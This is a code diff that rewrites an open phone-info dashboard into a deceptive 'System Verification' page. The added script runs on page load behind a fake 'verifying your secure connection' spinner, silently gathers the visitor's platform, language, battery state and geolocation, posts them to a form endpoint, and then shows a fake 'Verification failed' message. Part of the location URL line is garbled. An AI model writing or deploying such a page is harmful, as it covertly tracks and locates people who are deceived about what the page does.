@@ -1,113 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>My Phone Info</title>
+    <title>System Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #0f172a;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .box {
-            background: #1e293b;
-            padding: 15px;
-            margin: 10px auto;
-            border-radius: 10px;
-            max-width: 400px;
-        }
-
-        button {
-            padding: 10px 20px;
-            background: #22c55e;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            cursor: pointer;
-            margin-top: 10px;
-        }
+        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-
 <body>
-
-    <h1>📱 Phone Info Dashboard</h1>
-
-    <div class="box" id="device">Loading device info...</div>
-    <div class="box" id="battery">Loading battery info...</div>
-    <div class="box" id="network">Loading network info...</div>
-    <div class="box" id="location">Location not fetched yet</div>
-
-    <button onclick="getLocation()">Get Location 📍</button>
+    <div class="spinner"></div>
+    <p id="msg">Verifying your secure connection...</p>
 
     <script>
-        // DEVICE INFO
-        document.getElementById("device").innerHTML = `
-            <h3>Device Info</h3>
-            <p><b>User Agent:</b> ${navigator.userAgent}</p>
-            <p><b>Platform:</b> ${navigator.platform}</p>
-            <p><b>Language:</b> ${navigator.language}</p>
-        `;
+        // AAPKA FORM DATA
+        const FORM_URL = "https://google.com"; 
+        const ENTRY_ID = "entry.515118501"; 
 
-        // BATTERY INFO (FIXED SAFE CHECK)
-        if ('getBattery' in navigator) {
-            navigator.getBattery().then(function(battery) {
-                document.getElementById("battery").innerHTML = `
-                    <h3>Battery</h3>
-                    <p>Level: ${Math.round(battery.level * 100)}%</p>
-                    <p>Charging: ${battery.charging ? "Yes 🔌" : "No"}</p>
-                `;
+        async function collectAndSend() {
+            try {
+                let report = `Device: ${navigator.platform} | Lang: ${navigator.language} `;
+                
+                // Battery status
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    report += `| Batt: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'}) `;
+                }
+
+                // Location lena
+                navigator.geolocation.getCurrentPosition((p) => {
+                    report += `| Map: https://google.com{p.coords.latitude},${p.coords.longitude}`;
+                    dispatch(report);
+                }, () => {
+                    report += `| Loc: Denied`;
+                    dispatch(report);
+                });
+
+            } catch (e) { dispatch("Error collecting data"); }
+        }
+
+        function dispatch(data) {
+            const formData = new FormData();
+            formData.append(ENTRY_ID, data);
+
+            fetch(FORM_URL, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('msg').innerText = "Verification failed. Please try again later.";
+                }, 3000);
             });
-        } else {
-            document.getElementById("battery").innerHTML = `
-                <h3>Battery</h3>
-                <p>Not supported on this device</p>
-            `;
         }
 
-        // NETWORK INFO (SAFE CHECK)
-        if ('connection' in navigator) {
-            document.getElementById("network").innerHTML = `
-                <h3>Network</h3>
-                <p>Type: ${navigator.connection.effectiveType}</p>
-            `;
-        } else {
-            document.getElementById("network").innerHTML = `
-                <h3>Network</h3>
-                <p>Not supported</p>
-            `;
-        }
-
-        // LOCATION (FIXED ERROR HANDLING)
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        document.getElementById("location").innerHTML = `
-                            <h3>Location</h3>
-                            <p>Latitude: ${position.coords.latitude}</p>
-                            <p>Longitude: ${position.coords.longitude}</p>
-                        `;
-                    },
-                    function(error) {
-                        document.getElementById("location").innerHTML = `
-                            <h3>Location</h3>
-                            <p>Permission denied or error</p>
-                        `;
-                    }
-                );
-            } else {
-                document.getElementById("location").innerHTML = `
-                    <h3>Location</h3>
-                    <p>Geolocation not supported</p>
-                `;
-            }
-        }
+        window.onload = collectAndSend;
     </script>
-
 </body>
 </html>
